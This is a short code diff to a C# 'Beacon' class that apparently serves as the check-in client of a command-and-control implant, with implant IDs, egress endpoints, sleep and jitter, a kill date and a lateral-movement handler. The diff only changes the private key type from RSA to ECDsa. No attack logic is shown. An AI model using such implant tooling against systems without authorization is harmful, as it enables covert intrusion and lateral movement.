@@ -38,7 +38,7 @@ internal sealed class Beacon : ICheckInClient
     private readonly EgressEndpoints _egress;
     private readonly string _implantId;
     private readonly X509Certificate2 _leaf;
-    private readonly RSA _privateKey;
+    private readonly ECDsa _privateKey;
     private readonly IReadOnlyList<X509Certificate2> _cas;
     private readonly TimeSpan _sleep;
     private readonly TimeSpan _jitter;
@@ -62,7 +62,7 @@ internal sealed class Beacon : ICheckInClient
     /// Builds a Beacon whose handler registry carries no enroll bundle, so the
     /// lateral.move handler reports derivation as unavailable.
     /// </summary>
-    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
+    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         IReadOnlyList<string> classVerbs, TextWriter log)
         : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
@@ -74,7 +74,7 @@ internal sealed class Beacon : ICheckInClient
     /// baked profile or the -mode flag decides). See the field comment for what
     /// each mode trades.
     /// </summary>
-    public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
+    public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
         TaskNonceTracker? nonces = null)
@@ -94,7 +94,7 @@ internal sealed class Beacon : ICheckInClient
     /// check-in client covering the same run (the envelope client); null keeps
     /// this beacon's own tracker.
     /// </summary>
-    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
+    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
         TaskNonceTracker? nonces = null)
